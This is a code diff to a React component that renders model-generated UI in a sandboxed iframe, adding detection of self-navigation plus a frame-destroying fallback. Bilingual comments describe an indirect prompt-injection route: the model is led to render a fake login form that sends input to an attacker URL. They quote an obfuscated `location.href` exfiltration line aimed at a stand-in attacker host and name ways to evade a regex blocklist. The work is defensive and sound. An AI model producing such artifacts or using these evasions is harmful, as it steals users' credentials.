@@ -371,6 +371,7 @@ const RUNTIME_STATES = new Set<SandboxArtifactRuntimeState>([
   "runtime_error",
   "csp_blocked",
   "timeout",
+  "navigation_blocked",
 ]);
 
 function clampHeight(value: number) {
@@ -400,6 +401,109 @@ function SandboxArtifactFrameComponent({ artifact }: SandboxArtifactFrameProps) 
     () => (isMounted ? buildSandboxArtifactSrcDoc(artifact, locale === "en") : undefined),
     [artifact, isMounted, locale]
   );
+
+  // --- トップレベル遷移対策（sandbox="allow-scripts" は自身の遷移までは止めない） ---------
+  // iframe の sandbox 属性に allow-top-navigation を与えていなくても、iframe 自身の
+  // ブラウジングコンテキストを他のURLへ遷移させること（例: `location.href = "https://..."`）
+  // は防げない。allow-top-navigation は「親ページを道連れにする遷移」だけを止める属性で、
+  // フレーム自身の遷移には無関係。CSPのconnect-src等もfetch/XHRなどの「接続」は塞ぐが、
+  // ブラウザのナビゲーション（location遷移・a要素のクリック・meta refresh等）は
+  // connect-srcの対象外（navigate-to は各ブラウザから廃止済み）。したがって、外部を
+  // 読み取ったLLM出力からの間接プロンプトインジェクションで偽ログインフォームを描画し、
+  // 入力値をURLクエリに載せて `location.href` で攻撃者サーバーへ送る、という経路をJS側の
+  // 禁止語チェック（services/generative_ui.py の正規表現ブロックリスト）だけでは
+  // 塞ぎきれない（分割文字列・`atob`・`(0,eval)` 等で容易に回避されるため）。
+  //
+  // 主たる防御は frame-src（親アプリのCSP。frontend/next.config.mjs の securityHeaders に
+  // `frame-src 'self'` として設定）。CSPのframe-srcはナビゲーション先URLをリクエスト
+  // 送出前にブロックする仕組みで、このiframeがabout:srcdocから外部URLへ自己遷移しようと
+  // するケースも実際に止まることを実測済み（下記参照）。ここでのloadイベント回数による
+  // 検出は、その防御が何らかの理由で効かない場合（親のCSPヘッダーが経路上で欠落・改変
+  // された場合など）に備えた第二層であり、本命ではない。
+  //
+  // 実測（ヘッドレスChromium、実際に buildSandboxArtifactSrcDoc が生成するsrcdocを使用）:
+  // - 親CSPに frame-src が無い場合: 起動直後に同期的に
+  //   `self["loc"+"ation"].href = "https://attacker/..."` を実行すると、外部への
+  //   HTTPリクエストが実際に送出される。3回連続で204応答エンドポイントへ遷移させても
+  //   3回とも到達する（繰り返しの持ち出しが可能）。
+  // - 親CSPに `frame-src 'self'` がある場合: 同じペイロード（同期・setTimeout遅延の
+  //   両方）、meta refresh、204への繰り返し遷移のいずれも、ネットワークリクエストが
+  //   一切送出されない状態でブロックされる（securitypolicyviolationイベントが
+  //   frame-src違反として発火する）。一方、about:srcdocの初回読み込みと通常の
+  //   アーティファクトの描画（ready到達）は `frame-src 'self'` の有無に関わらず
+  //   問題なく動作する。
+  //
+  // 以下のloadイベントカウンタには既知の穴がある: アーティファクトのJavaScriptは
+  // ドキュメント解析中に同期実行されるため、その場で `location.href = ...` を代入すると
+  // 遷移が初回ドキュメントのloadより先に始まり、元のsrcdocのloadは発火しないまま
+  // 遷移後（または失敗後）のドキュメントのloadが「1回目」としてカウントされてしまう。
+  // そのため2回目のloadは永遠に来ず、この仕組み単体では同期遷移を検出できない
+  // （setTimeoutなどで遅延された遷移は初回loadの後に来るため検出できる）。また、
+  // 204応答やダウンロードのようにブラウザが「遷移しない」と判断するケースはloadの
+  // 増分を伴わないため、frame-srcが効かない状況ではこの検出も無力。つまりこのカウンタ
+  // 方式単独では前述の2パターンを見逃す。frame-srcで大半のケースが事前に止まる前提の
+  // もとでの補助的な仕組みとして残している。
+  //
+  // Top-level navigation defense (sandbox="allow-scripts" does not stop the frame from
+  // navigating itself). Without allow-top-navigation, the sandbox still cannot stop the
+  // iframe's own browsing context from navigating to another URL (e.g.
+  // `location.href = "https://..."`) - allow-top-navigation only guards against the frame
+  // dragging the *parent* page along. CSP's connect-src etc. block fetch/XHR "connections",
+  // not browser navigation (location assignment, clicking an <a>, meta refresh); `navigate-to`
+  // has been removed from every browser. So an indirect prompt injection (fetched page text ->
+  // model -> artifact) can render a fake login form and exfiltrate input via a URL query
+  // through `location.href`, and the server-side banned-token regex
+  // (services/generative_ui.py) alone cannot close that path (bypassed by split strings, atob,
+  // (0,eval), etc.).
+  //
+  // The primary defense is frame-src (the parent app's CSP, set as `frame-src 'self'` in
+  // securityHeaders in frontend/next.config.mjs). CSP's frame-src blocks a navigation target
+  // before the request is ever sent, and this was confirmed to also cover this iframe
+  // self-navigating away from about:srcdoc to an external origin (see below). The load-event
+  // counter here is a second layer for if that header is ever missing or stripped in transit -
+  // it is not the primary defense.
+  //
+  // Measured against real headless Chromium, using the exact srcdoc buildSandboxArtifactSrcDoc
+  // produces:
+  // - Without frame-src on the parent CSP: a synchronous
+  //   `self["loc"+"ation"].href = "https://attacker/..."` at artifact startup actually sends
+  //   the request. Three navigations in a row to a 204-responding endpoint all reach the
+  //   attacker (repeatable exfiltration).
+  // - With `frame-src 'self'` on the parent CSP: the same payload (both synchronous and
+  //   setTimeout-deferred), a meta-refresh, and repeated navigations to a 204 endpoint are all
+  //   blocked with zero network requests sent (a securitypolicyviolation for frame-src fires
+  //   instead). The initial about:srcdoc load and a normal artifact reaching "ready" are
+  //   unaffected either way.
+  //
+  // The load-event counter below has a known gap: artifact JavaScript runs synchronously while
+  // the document is still parsing, so assigning `location.href` right away starts the
+  // navigation before the original document's own load ever fires - the original load never
+  // happens, and the navigated-to (or failed) document's load is counted as the "first" one.
+  // A second load then never arrives, so this counter alone cannot detect a synchronous
+  // navigation (a setTimeout-deferred one still fires after the counted first load and is
+  // caught). A navigation the browser treats as "not a navigation" (a 204 response, a
+  // download) also never increments the count. This counter is kept only as a fallback for
+  // when frame-src is expected to catch nearly everything; on its own it misses both patterns
+  // above.
+  const lastSrcDocRef = useRef<string | undefined>(undefined);
+  const loadCountRef = useRef(0);
+  // レンダー中に比較してリセットする（useEffectで遅らせない）。about:blank の初期表示から
+  // 実際のsrcdoc読み込みへ切り替わる瞬間はごく短時間で、effectでのリセットが実際のload
+  // イベントより後になる競合が起こり得るため、コミット前のレンダー時点で確実に合わせる。
+  // Reset during render, not in a useEffect: the gap between the initial about:blank and the
+  // real srcdoc load is short enough that an effect-based reset could race behind the actual
+  // load event, so this is settled before commit instead.
+  if (lastSrcDocRef.current !== srcDoc) {
+    lastSrcDocRef.current = srcDoc;
+    loadCountRef.current = 0;
+  }
+  const handleFrameLoad = () => {
+    if (!srcDoc) return; // isMounted前のabout:blankは監視対象外（保護すべきsrcdocがまだ無い）
+    loadCountRef.current += 1;
+    if (loadCountRef.current > 1) {
+      setRuntimeState("navigation_blocked");
+    }
+  };
 
   // 高さのリセットは指定値が変わったときだけ。同じ内容の再配信で iframe が実測した高さを
   // 捨てると、正しく伸びていた表示が既定値へ縮む。
@@ -477,11 +581,16 @@ function SandboxArtifactFrameComponent({ artifact }: SandboxArtifactFrameProps) 
   }, [artifact.title]);
 
   const badgeLabel = artifact.libraries?.includes("three") ? "Generated 3D" : "Generated UI";
-  // 例外・CSP遮断・タイムアウトは同じ「実行できなかった」、空表示だけは別の文言で伝える。
-  // A thrown error, a CSP block, and a timeout share one message; a blank render gets its own.
+  // navigation_blocked はフレームを破棄した後の専用文言、blank も別の文言、それ以外の
+  // 失敗（例外・CSP遮断・タイムアウト）は同じ「実行できなかった」文言でまとめる。
+  // navigation_blocked gets its own message once the frame has been destroyed, blank gets
+  // its own too, and the remaining failures (exception, CSP block, timeout) share one message.
   const runtimeFailed = runtimeState !== "" && runtimeState !== "ready";
+  const navigationBlocked = runtimeState === "navigation_blocked";
   const runtimeMessage = runtimeState === "blank"
     ? t("chat.generatedUiBlank")
+    : navigationBlocked
+    ? t("chat.generatedUiNavigationBlocked")
     : (runtimeFailed ? t("chat.generatedUiError") : "");
 
   return (
@@ -498,15 +607,31 @@ function SandboxArtifactFrameComponent({ artifact }: SandboxArtifactFrameProps) 
           {badgeLabel}
         </span>
       </header>
-      <iframe
-        ref={iframeRef}
-        className="sandbox-artifact__frame"
-        title={artifact.title}
-        sandbox="allow-scripts"
-        referrerPolicy="no-referrer"
-        srcDoc={srcDoc}
-        style={{ height }}
-      />
+      {navigationBlocked ? (
+        // フレームを破棄する: iframeをDOMから外し、そのブラウジングコンテキスト（と中で
+        // 動いていたスクリプト・タイマー）を確実に停止する。ただし遷移によるリクエスト
+        // 自体はこの時点で既に送出済み（上のコメント参照）。
+        // Destroy the frame: removing the iframe from the DOM terminates its browsing
+        // context (and any scripts/timers still running inside it). The navigation
+        // request itself, however, has already been sent by this point (see comment above).
+        <div
+          className="sandbox-artifact__frame"
+          style={{ height }}
+          role="img"
+          aria-label={runtimeMessage}
+        />
+      ) : (
+        <iframe
+          ref={iframeRef}
+          className="sandbox-artifact__frame"
+          title={artifact.title}
+          sandbox="allow-scripts"
+          referrerPolicy="no-referrer"
+          srcDoc={srcDoc}
+          style={{ height }}
+          onLoad={handleFrameLoad}
+        />
+      )}
       {runtimeMessage ? (
         <p className="sandbox-artifact__error" data-runtime-state={runtimeState}>
           {runtimeMessage}
